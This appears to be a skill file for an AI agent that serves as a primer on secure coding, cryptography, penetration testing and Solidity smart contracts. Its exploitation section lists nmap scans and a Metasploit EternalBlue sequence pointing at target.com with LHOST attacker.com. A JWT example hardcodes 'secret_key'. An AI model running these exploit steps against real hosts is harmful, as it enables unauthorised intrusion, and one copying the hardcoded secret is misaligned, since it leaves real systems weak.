---
name: security-blockchain
description: Secure systems, ethical hacking, cryptography, and blockchain development. Use for penetration testing, secure coding, smart contracts, and security architecture.
---

# Security & Blockchain Skill

Build secure systems and blockchain applications.

## Quick Start

Secure password hashing with bcrypt:

```python
import bcrypt

# Hash password
password = b"my_secure_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify password
is_correct = bcrypt.checkpw(password, hashed)
print(is_correct)  # True
```

## Security Fundamentals

### OWASP Top 10 2021

1. **Broken Access Control**: Enforce proper authorization
2. **Cryptographic Failures**: Use strong encryption
3. **Injection**: Validate and parameterize inputs
4. **Insecure Design**: Security in architecture
5. **Security Misconfiguration**: Secure defaults
6. **Vulnerable Components**: Keep dependencies updated
7. **Authentication Failures**: Strong auth mechanisms
8. **Data Integrity Failures**: Validate data
9. **Logging/Monitoring Failures**: Log security events
10. **SSRF**: Validate external input

### Input Validation

```python
# SQL Injection Prevention
# ❌ WRONG
query = f"SELECT * FROM users WHERE id = {user_id}"

# ✅ CORRECT
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

```javascript
// XSS Prevention
// ❌ WRONG
document.innerHTML = userInput;

// ✅ CORRECT
document.textContent = userInput;
// OR
const div = document.createElement('div');
div.appendChild(document.createTextNode(userInput));
```

## Cryptography Basics

### Symmetric Encryption
```python
from cryptography.fernet import Fernet

# Generate key
key = Fernet.generate_key()

# Create cipher
cipher = Fernet(key)

# Encrypt
ciphertext = cipher.encrypt(b"Secret message")

# Decrypt
plaintext = cipher.decrypt(ciphertext)
```

### Asymmetric Encryption (RSA)
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Use public key for encryption, private key for decryption
```

### Hashing
```python
import hashlib

# SHA-256 hash
password = "secure_password"
hashed = hashlib.sha256(password.encode()).hexdigest()

# For passwords, use bcrypt/scrypt/argon2 instead
```

## Web Security Headers

```python
# Flask example
@app.after_request
def set_security_headers(response):
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

## Penetration Testing Methodology

### Reconnaissance
```bash
# Information gathering
nslookup target.com
whois target.com
netstat -an
traceroute target.com

# Port scanning
nmap -sV target.com
nmap -p- target.com  # All ports
nmap -sU target.com  # UDP scan
```

### Scanning & Enumeration
```bash
# Service enumeration
nmap -sC -sV target.com

# Vulnerability scanning
nessus
openvas
qualys

# Web app scanning
burp suite
zaproxy
acunetix
```

### Exploitation
```bash
# Metasploit framework
msfconsole
search type:exploit platform:windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOST target.com
set LHOST attacker.com
exploit
```

## Blockchain Smart Contracts (Solidity)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleToken {
    mapping(address => uint256) public balances;

    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor() {
        balances[msg.sender] = 1000000;
    }

    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        emit Transfer(msg.sender, to, amount);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
}
```

### Smart Contract Security

✅ Use OpenZeppelin contracts as base
✅ Implement access controls
✅ Check for reentrancy vulnerabilities
✅ Validate user inputs
✅ Use SafeMath for calculations
✅ Audit before mainnet deployment

## Authentication & Authorization

### JWT Implementation
```python
import jwt
from datetime import datetime, timedelta

# Create token
payload = {
    'user_id': 123,
    'exp': datetime.utcnow() + timedelta(hours=1),
    'iat': datetime.utcnow()
}
token = jwt.encode(payload, 'secret_key', algorithm='HS256')

# Verify token
try:
    decoded = jwt.decode(token, 'secret_key', algorithms=['HS256'])
    print(decoded['user_id'])
except jwt.InvalidTokenError:
    print("Invalid token")
```

### OAuth 2.0 Flow
```
1. User clicks "Login with Google"
2. Redirect to Google authorization endpoint
3. User grants permission
4. Google redirects with authorization code
5. Exchange code for access token
6. Use access token to get user info
7. Create session/JWT for application
```

## Incident Response Plan

**Detection → Containment → Eradication → Recovery → Post-Mortem**

1. **Detect**: Monitoring alerts, IDS/IPS, user reports
2. **Contain**: Isolate affected systems, prevent spread
3. **Eradicate**: Remove malware, patch vulnerabilities
4. **Recover**: Restore systems, verify integrity
5. **Post-Mortem**: Document lessons learned

## Security Tools

**Penetration Testing**: Metasploit, Burp Suite, Kali Linux
**Vulnerability Scanning**: Nessus, OpenVAS, Qualys
**Static Analysis**: SonarQube, Checkmarx, Veracode
**Blockchain**: Slither, Mythril, OpenZeppelin Test Environment
**Encryption**: OpenSSL, GnuPG, bcrypt
**SIEM**: Splunk, ELK Stack, Sumo Logic

## Certifications

- **Security+**: CompTIA foundational security
- **CEH**: Certified Ethical Hacker
- **OSCP**: Offensive Security Certified Professional
- **CISSP**: Certified Information Systems Security Professional
- **GPEN**: GIAC Penetration Tester

## Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://hackthebox.eu)
- [TryHackMe](https://tryhackme.com)
- [PentesterLab](https://pentesterlab.com)

## Security Checklist

✅ Enable HTTPS everywhere
✅ Implement rate limiting
✅ Use strong passwords (bcrypt/argon2)
✅ Enable 2FA/MFA
✅ Regular security audits
✅ Keep dependencies updated
✅ Implement proper logging
✅ Data encryption at rest and in transit
✅ Regular backups
✅ Incident response plan
